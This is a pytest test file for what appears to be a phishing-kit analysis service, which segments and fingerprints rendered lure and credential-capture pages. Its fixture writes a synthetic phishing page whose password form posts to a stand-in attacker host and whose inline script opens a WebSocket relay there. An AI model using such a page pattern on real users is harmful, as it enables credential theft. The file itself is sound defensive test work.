"""Integration tests for stage ingest (build_and_store_stages).

Exercises the sync pipeline end-to-end against an in-memory SQLite DB and
a synthetic render directory: segmentation → fingerprinting → content-
addressed resource storage → Stage/StageResource rows.
"""

from __future__ import annotations

import json
import uuid

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import Session

from darla.models import (
    Base,
    Kit,
    KitStatus,
    Resource,
    Stage,
    StageResource,
)
from darla.models.stage import StageRole
from darla.services.stage_service import build_and_store_stages


@pytest.fixture()
def db() -> Session:
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine, tables=[
        Kit.__table__,
        Stage.__table__,
        Resource.__table__,
        StageResource.__table__,
    ])
    session = Session(engine)
    try:
        yield session
    finally:
        session.close()


def _make_kit(db: Session) -> Kit:
    kit = Kit(
        id=uuid.uuid4(),
        source_url="https://lure.example/doc",
        status=KitStatus.DOWNLOADED,
        chain_depth=1,
        discovery_method="browser_render",
    )
    db.add(kit)
    db.flush()
    return kit


def _write_render(tmp_path, *, with_resource=True):
    """Write a synthetic 2-stage render dir: lure → cred capture."""
    (tmp_path / "_stages").mkdir()
    (tmp_path / "_stages" / "stage_00.html").write_text(
        "<html><body><h1>Click here to view the document</h1></body></html>",
        encoding="utf-8",
    )
    (tmp_path / "_stages" / "stage_01.html").write_text(
        "<html><body><form action='https://evil.example/collect'>"
        "<input type='password' name='p'>"
        "<script>new WebSocket('wss://evil.example/relay/abc123def456')</script>"
        "</form></body></html>",
        encoding="utf-8",
    )
    manifest_entries = []
    if with_resource:
        res_dir = tmp_path / "_browser_resources"
        res_dir.mkdir()
        (res_dir / "010_harvester.js").write_text(
            "console.log('harvest');" * 5, encoding="utf-8",
        )
        manifest_entries = [
            {"filename": "_browser_resources/010_harvester.js",
             "url": "https://evil.example/harvester.js",
             "content_type": "application/javascript",
             "timestamp": 6.0, "status": 200, "method": "GET"},
        ]
        (res_dir / "_manifest.json").write_text(
            json.dumps(manifest_entries), encoding="utf-8",
        )
    stages = [
        {"seq": 0, "url": "https://lure.example/doc", "started_ts": 0.0,
         "ended_ts": 3.0, "nav_method": "initial",
         "body_file": "_stages/stage_00.html", "status_code": 200,
         "content_type": "text/html", "visible_text": "click here to view",
         "markers": {}},
        {"seq": 1, "url": "https://login.evil.example/", "started_ts": 5.0,
         "ended_ts": 9.0, "nav_method": "cta_click",
         "body_file": "_stages/stage_01.html", "status_code": 200,
         "content_type": "text/html",
         "visible_text": "sign in", "markers": {"password_field": True}},
    ]
    (tmp_path / "stages.json").write_text(
        json.dumps({"stages": stages, "final_url": "https://login.evil.example/"}),
        encoding="utf-8",
    )


def test_build_and_store_stages_creates_rows(tmp_path, db):
    kit = _make_kit(db)
    _write_render(tmp_path)

    written = build_and_store_stages(db, kit, tmp_path)
    db.commit()

    assert written == 2
    stages = db.query(Stage).filter(Stage.kit_id == kit.id).order_by(Stage.seq).all()
    assert [s.seq for s in stages] == [0, 1]
    assert stages[0].role == StageRole.LURE
    assert stages[1].role == StageRole.CRED_CAPTURE
    # Fingerprints populated.
    assert stages[1].skeleton_hash is not None
    assert stages[1].tlsh_rendered is not None  # final stage gets rendered tlsh


def test_build_and_store_stages_content_addresses_resource(tmp_path, db):
    kit = _make_kit(db)
    _write_render(tmp_path)
    build_and_store_stages(db, kit, tmp_path)
    db.commit()

    # The external JS resource is stored once, content-addressed.
    resources = db.query(Resource).all()
    # harvester.js + the inline script from stage_01 both become resources.
    shas = {r.sha256 for r in resources}
    assert len(shas) == len(resources)  # all unique
    assert len(resources) >= 2

    links = db.query(StageResource).all()
    assert any(link.initiator == "inline" for link in links)


def test_cred_stage_captures_ws_endpoint(tmp_path, db):
    kit = _make_kit(db)
    _write_render(tmp_path)
    build_and_store_stages(db, kit, tmp_path)
    db.commit()

    cred = db.query(Stage).filter(Stage.role == StageRole.CRED_CAPTURE).one()
    endpoints = cred.fingerprint.get("endpoints", [])
    assert any("evil.example/relay" in e for e in endpoints)


def test_build_is_idempotent(tmp_path, db):
    kit = _make_kit(db)
    _write_render(tmp_path)
    build_and_store_stages(db, kit, tmp_path)
    db.commit()
    build_and_store_stages(db, kit, tmp_path)
    db.commit()
    # Rebuilding replaces, not appends.
    assert db.query(Stage).filter(Stage.kit_id == kit.id).count() == 2


def test_no_stages_json_returns_zero(tmp_path, db):
    kit = _make_kit(db)
    assert build_and_store_stages(db, kit, tmp_path) == 0
